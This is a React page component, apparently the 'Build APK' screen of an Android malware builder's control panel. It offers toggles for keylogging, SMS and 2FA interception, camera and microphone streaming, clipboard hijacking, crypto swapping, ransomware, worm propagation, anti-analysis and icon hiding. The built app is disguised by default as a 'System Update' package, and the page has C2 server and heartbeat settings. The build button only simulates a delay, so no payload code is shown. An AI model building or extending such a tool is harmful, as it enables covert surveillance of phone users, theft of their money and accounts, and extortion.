import { useState } from 'react'
import PageHeader from '../components/PageHeader'
import { Package, Download, Settings, Shield, Eye, Key, Wifi, Bell, Mic, Camera, FileText, Lock, Wrench } from 'lucide-react'

const features = [
  { id: 'keylogger', label: 'Keylogger', icon: Key, category: 'surveillance' },
  { id: 'screenlogger', label: 'Screenlogger', icon: Eye, category: 'surveillance' },
  { id: 'sms_logs', label: 'SMS Logs', icon: FileText, category: 'surveillance' },
  { id: 'notification_logs', label: 'Notification Logs', icon: Bell, category: 'surveillance' },
  { id: 'crypto_swap', label: 'Crypto Swap', icon: Lock, category: 'financial' },
  { id: 'show_notifications', label: 'Show Notifications', icon: Bell, category: 'surveillance' },
  { id: 'camera_stream', label: 'Camera Stream', icon: Camera, category: 'surveillance' },
  { id: 'mic_stream', label: 'Microphone Stream', icon: Mic, category: 'surveillance' },
  { id: 'location_track', label: 'Location Tracking', icon: Wifi, category: 'surveillance' },
  { id: 'clipboard_hijack', label: 'Clipboard Hijack', icon: FileText, category: 'surveillance' },
  { id: 'contact_steal', label: 'Contact Stealer', icon: FileText, category: 'surveillance' },
  { id: 'file_manager', label: 'Remote File Manager', icon: Wrench, category: 'control' },
  { id: 'ransomware', label: 'Ransomware Module', icon: Lock, category: 'attack' },
  { id: 'worm_propagate', label: 'Worm Propagation', icon: Wifi, category: 'attack' },
  { id: 'ats_module', label: 'ATS Module', icon: Lock, category: 'financial' },
  { id: '2fa_intercept', label: '2FA Interception', icon: Shield, category: 'surveillance' },
  { id: 'anti_analysis', label: 'Anti-Analysis', icon: Shield, category: 'evasion' },
  { id: 'device_admin', label: 'Device Admin', icon: Shield, category: 'persistence' },
  { id: 'doze_whitelist', label: 'Doze Whitelist', icon: Bell, category: 'persistence' },
  { id: 'icon_hide', label: 'Hide Icon', icon: Eye, category: 'evasion' },
]

export default function BuildApkPage() {
  const [config, setConfig] = useState({
    app_name: 'System Update',
    package_name: 'com.android.system.update',
    version: '1.0.0',
    icon_type: 'default',
    c2_server: '',
    c2_port: '3001',
    encryption_key: '',
    heartbeat_interval: 30,
    features: {}
  })
  const [building, setBuilding] = useState(false)

  const toggleFeature = (id) => {
    setConfig(prev => ({
      ...prev,
      features: { ...prev.features, [id]: !prev.features[id] }
    }))
  }

  const handleBuild = async () => {
    setBuilding(true)
    await new Promise(r => setTimeout(r, 2000))
    setBuilding(false)
  }

  const categories = {
    surveillance: 'Surveillance',
    financial: 'Financial',
    control: 'Remote Control',
    attack: 'Attack Modules',
    evasion: 'Evasion',
    persistence: 'Persistence'
  }

  return (
    <div className="animate-fade-in">
      <PageHeader title="Build APK" icon={Package} deviceSelector={false}>
        <button onClick={handleBuild} disabled={building} className="wuzen-btn-primary">
          <Download className="w-4 h-4" />
          {building ? 'BUILDING...' : 'BUILD APK'}
        </button>
      </PageHeader>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-6">
          <div className="wuzen-panel p-6">
            <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4 flex items-center gap-2">
              <Settings className="w-4 h-4" /> Build Configuration
            </h3>
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">App Name</label>
                <input className="wuzen-input w-full" value={config.app_name} onChange={e => setConfig(p => ({...p, app_name: e.target.value}))} />
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">Package Name</label>
                <input className="wuzen-input w-full" value={config.package_name} onChange={e => setConfig(p => ({...p, package_name: e.target.value}))} />
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">Version</label>
                <input className="wuzen-input w-full" value={config.version} onChange={e => setConfig(p => ({...p, version: e.target.value}))} />
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">C2 Server</label>
                <input className="wuzen-input w-full" placeholder="https://your-c2.com" value={config.c2_server} onChange={e => setConfig(p => ({...p, c2_server: e.target.value}))} />
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">C2 Port</label>
                <input className="wuzen-input w-full" value={config.c2_port} onChange={e => setConfig(p => ({...p, c2_port: e.target.value}))} />
              </div>
              <div>
                <label className="text-xs text-wuzen-muted uppercase mb-1 block">Heartbeat (sec)</label>
                <input type="number" className="wuzen-input w-full" value={config.heartbeat_interval} onChange={e => setConfig(p => ({...p, heartbeat_interval: parseInt(e.target.value)}))} />
              </div>
            </div>
          </div>

          <div className="wuzen-panel p-6">
            <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4 flex items-center gap-2">
              <Shield className="w-4 h-4" /> Feature Selection
            </h3>
            {Object.entries(categories).map(([cat, label]) => (
              <div key={cat} className="mb-6">
                <h4 className="text-xs text-wuzen-primary uppercase tracking-wider mb-3">{label}</h4>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                  {features.filter(f => f.category === cat).map(f => {
                    const Icon = f.icon
                    const enabled = config.features[f.id]
                    return (
                      <button
                        key={f.id}
                        onClick={() => toggleFeature(f.id)}
                        className={`flex items-center gap-3 p-3 rounded-lg border transition-all duration-200 text-left
                          ${enabled 
                            ? 'bg-wuzen-success/10 border-wuzen-success/40 text-wuzen-success' 
                            : 'bg-wuzen-card border-wuzen-border text-wuzen-muted hover:border-wuzen-primary/30'}`}
                      >
                        <div className={`w-8 h-8 rounded flex items-center justify-center ${enabled ? 'bg-wuzen-success/20' : 'bg-wuzen-panel'}`}>
                          <Icon className="w-4 h-4" />
                        </div>
                        <span className="text-sm">{f.label}</span>
                        <div className={`ml-auto w-10 h-5 rounded-full relative transition-colors ${enabled ? 'bg-wuzen-success' : 'bg-wuzen-border'}`}>
                          <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${enabled ? 'translate-x-5' : 'translate-x-0.5'}`} />
                        </div>
                      </button>
                    )
                  })}
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="wuzen-panel p-6 h-fit">
          <h3 className="text-sm font-semibold uppercase tracking-wider text-wuzen-muted mb-4">Build Preview</h3>
          <div className="space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-wuzen-muted">App Name</span>
              <span className="text-wuzen-text">{config.app_name}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-wuzen-muted">Package</span>
              <span className="text-wuzen-text font-mono text-xs">{config.package_name}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-wuzen-muted">Version</span>
              <span className="text-wuzen-text">{config.version}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-wuzen-muted">Features</span>
              <span className="text-wuzen-primary">{Object.values(config.features).filter(Boolean).length} enabled</span>
            </div>
            <div className="pt-3 border-t border-wuzen-border">
              <p className="text-xs text-wuzen-muted mb-2">Enabled modules:</p>
              <div className="flex flex-wrap gap-1">
                {Object.entries(config.features).filter(([,v]) => v).map(([k]) => (
                  <span key={k} className="px-2 py-0.5 rounded text-[10px] bg-wuzen-primary/10 text-wuzen-primary border border-wuzen-primary/20">
                    {k}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
